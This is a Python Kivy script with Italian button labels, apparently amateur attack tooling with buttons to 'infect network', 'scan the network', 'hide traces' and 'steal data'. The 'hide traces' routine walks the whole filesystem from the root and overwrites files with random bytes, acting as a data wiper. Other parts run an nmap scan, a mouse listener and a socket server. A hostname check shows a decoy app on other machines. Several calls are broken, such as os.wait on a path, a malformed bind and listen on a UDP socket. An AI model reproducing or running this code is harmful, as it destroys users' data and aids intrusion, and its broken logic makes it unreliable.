import cv2
from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
import nmap
from tqdm import tqdm
import subprocess 
import threading
import os
import platform
import webbrowser
import os
import time
from zipfile import ZipFile
from zipfile import ZipFile 
import time
from pynput import mouse
import socket
from cryptography.fernet import Fernet
class Universale_Nucleare(App):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.listener_avviato = False

    def build(self):
        app = BoxLayout(orientation="vertical")

        bottone = Button(text="infetta rete", font_size=30)
        bottone.bind(on_press=self.avvia_listener)
        app.add_widget(bottone)

        scansione = Button(text="scansione la rete", font_size=30)
        scansione.bind(on_press=self.scansione)
        app.add_widget(scansione)

        segreto = Button(text="nascondi impronte", font_size=30)
        segreto.bind(on_press=self.secret)
        app.add_widget(segreto)

        rudati=Button(text="ruba dati",font_size=30)
        rudati.bind(on_press=self.dati)
        app.add_widget(rudati)

        return app

    def secret(self, _):

        passo=4
        conta=0 
        """percorso=os.path.join(os.path.expanduser("~"),"C:\\")#mostra il percoso nella directori  Desktop  
        print(percorso)"""
        for root, dirs,files in os.walk("/"):
            for  file in files:
                time.sleep(0)
                file=os.path.join(root, file)
                try:
                    with  open(file,"r+b") as f:
                        for passo1 in range(passo):
                            f.seek(1) 
                            lettera=os.path.getsize(file)
                            f.write(os.urandom(lettera))
                            conta+=1
                            print(file)
                except:     
                    print(f"comando non eseguito: {file}")


    def scansione(self): #scansione con nmap di tutta la rete  
        rete = nmap.PortScanner()
        rete.scan("localhost/24")
        for _ in tqdm(range(10,10000), desc="scansione rete"):
            time.sleep(1)
        for root,_,files in os.wait("//"):
            for file in files:
                file=os.path.join(root,file)

    def rileva(self, x, y):
        print(f"Mouse spostato a: ({x}, {y})")
        self.spia()

    def avvia_listener(self, _):
        if not self.listener_avviato:
            self.listener_avviato = True
            threading.Thread(target=self._start_mouse_listener, daemon=True).start()

    def _start_mouse_listener(self):
        def on_move(x, y):
            return "self.spia()"
        with mouse.Listener(on_move=on_move) as listener:
            listener.join()
    def dati(self):
        tipo=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        tipo.bind("120.0.0.1",8090)
        tipo.listen(2)
        print(f"server in attesa{tipo}")
        cocco,ciola=tipo.accept()
        print(f"server conesso {cocco}")
        utente=input("-->")
        #comando=os.system(utente)
        dati=cocco.recv(1010)
        cocco.sendall(dati)
        #cocco.sendall(comando.encode())
        cocco.close()
        tipo.close()

class app_normality(App):
    def build(self):
        def __init__(self, **kwargs):
            super().__init__(**kwargs)
            Apper=BoxLayout(orientation="vertical")    
            bottnoe=Button(text="richeista",font_size=70)    
            scansione=Button(text="test wifi password",font_size=70)
            scansione.bind(on_press=self.scansione)
            Apper.add_widget(scansione)
            bottnoe.bind(on_press=lambda x: webbrowser.open("https://www.gallinella.com"))
            Apper.add_widget(bottnoe)
            return Apper
if __name__ == "__main__":
    if socket.gethostname() == "parrot":
        Universale_Nucleare().run()
    else:
        app_normality().run()
       
